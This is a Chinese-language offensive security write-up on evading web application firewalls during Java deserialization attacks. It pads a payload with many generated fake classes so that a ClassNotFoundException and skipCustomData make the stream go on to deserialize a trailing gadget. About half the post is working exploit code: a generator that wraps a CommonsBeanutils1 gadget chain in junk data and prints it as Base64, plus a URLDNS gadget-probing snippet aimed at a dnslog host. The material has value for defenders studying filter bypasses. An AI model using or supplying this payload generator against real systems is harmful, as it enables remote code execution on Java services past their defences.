@Y4tacker
对Java反序列化脏数据绕WAF新姿势的补
充
引⾔
相信⼤家都看过回忆飘如雪⼤师傅的⼀篇⽂章，Java反序列化数据绕WAF之加⼤量脏数据，
在这篇⽂章当中⼤师傅提出了通过将gadget加⼊到集合类型从⽽可以实现添加脏数据，这⾥我
发现了⼀个新姿势
灵感也是来源于回忆飘如雪⼤师傅的另⼀篇⽂章的⼀个⼀笔带过的问题上
这原本是⼤师傅想来搞gadget探测的⽅案，但是却失败了，但本着专研的⼯匠精神，我对这个
问题进⾏了深⼊的研究，这⾥顺便对这个问题解读
为什么这⾥第⼀个属性反序列化失败，仍然触发了URLDNS的整个
过程
顺便这⾥多提⼀嘴，为什么之后⼤师傅提出的直接将URLDNS中的HashMap的键值对中将key
或者value任意替换⼀个为需要探测的class就可以呢，其实核⼼原因在于是否能触发之后的
hash()函数！
这⾥我们调重点来讲，好了我们来看看当产⽣ ClassNotFoundException 后，最终
在 java.io.ObjectInputStream#readSerialData ,在抛出异常之后他会去继续调
⽤ skipCustomData
这⾥有个if判断，⼤概是判断当前是否还在块数据当中，如果是跳到下⼀个块数据当中，每个
块分隔是通过0x78这个字节，因为这个字节是⼀个块的结尾
接下来是⼀个switch循环，通过下⼀字节来判断，这⾥如果都不是则会直接对下⼀段进⾏反序
列化！！！很神奇吧
因此现在我们就能解释为什么当初对于，这⼀段代码我们能够成功触发URLDNS的反序列化
过程呢，没错就是上⾯这张图，他直接对下⼀个块数据继续执⾏反序列化因此对HashMap的
反序列化最终导致URLDNS完整触发
那么为什么这样却能实现需求呢
在这⾥当调⽤了 K key = (K) s.readObject(); 由于类不存在抛出异常，之后继续对下
⼀块数据进⾏反序列化，最终抛出异常后也不可能继续调⽤下⾯的 value = 
s.readObjet() 了，更别谈通过hash函数最终触发URLDNS，因此最终能够成功
List a = new LinkedList();
a.add(makeClass("TargetClass"));
a.add(new URLDNS.getObject("http://test.dnslog.cn"));
HashMap ht = new HashMap();
URL u = new URL(null, url, handler); 
ht.put(u,我是要探测的gadget); 
灵感⼤发
既然在抛出 ClassNotFoundException 后他还会去继续反序列化下⼀块数据，并且这是个
相当于while True的东西
！！
那么我们是不是就可以这样疯狂套娃实现垃圾数据呢？说⼲就⼲，当然⼤家别忘了引⼊
javassist的依赖
简简单单对CommonsBeanutils1来发测试
public class Test {
    public static Class makeClass(String clazzName) throws Exception{
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.makeClass(clazzName);
        Class clazz = ctClass.toClass();
        ctClass.defrost();
        return clazz;
    }
当然这⾥还有⼀个⼩坑就是
⼤家不要直接像这样，之前makeClass是返回的Class默认是继承序列化借⼜的，这样就导致虽
然也能弹出计算器，但只是因为linkedList对⾥⾯的元素循环遍历执⾏readObject的结果，⽽不
是本篇提出的通过在ClassNotFoundException利⽤skipCustomData后读取下⼀块数据执⾏反序
列化利⽤的过程
    public static void main(String[] args) throws Exception{
        PriorityQueue priorityQueue = CB1.getObject();
        LinkedList linkedList = new LinkedList();
        StringBuilder sb = new StringBuilder();
        for(int i=0;i<100;i++){
            sb.append("e");
            linkedList.add(makeClass("woshijiad"+sb));
        }
        linkedList.add(priorityQueue);
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(linkedList);
        oos.close();
        System.out.println(Base64.encode(barr.toByteArray()));
    }
}
PriorityQueue priorityQueue = CB1.getObject();
LinkedList linkedList = new LinkedList();
StringBuilder sb = new StringBuilder();
for(int i=0;i<100;i++){
sb.append("e");
linkedList.add(makeClass("woshijiad"+sb));
}
linkedList.add(priorityQueue);
ByteArrayOutputStream barr = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(barr);
oos.writeObject(linkedList);
oos.close();
//不要同时运⾏
ObjectInputStream ois = new ObjectInputStream(new 
ByteArrayInputStream(barr.toByteArray()));
ois.readObject();